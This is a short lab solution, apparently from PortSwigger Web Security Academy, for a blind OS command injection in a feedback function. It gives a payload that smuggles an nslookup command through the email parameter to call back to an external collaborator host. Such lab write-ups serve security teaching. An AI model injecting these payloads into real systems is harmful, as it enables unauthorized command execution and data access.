## Blind OS command injection with out-of-band interaction

**Category:** rce
**Difficulty:** Unknown

### Description
This lab contains a blind OS command injection vulnerability in the feedback function.

### Solution Steps
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the email parameter, changing it to: email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified email parameter.

### Key Payloads
- `email`
- `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`

### Indicators of Success
- Command output visible in response
- Time delay confirms blind execution
- DNS/HTTP callback received at external server
- File created, modified, or deleted
- System information extracted (whoami, id)
---
*Source: PortSwigger Web Security Academy*
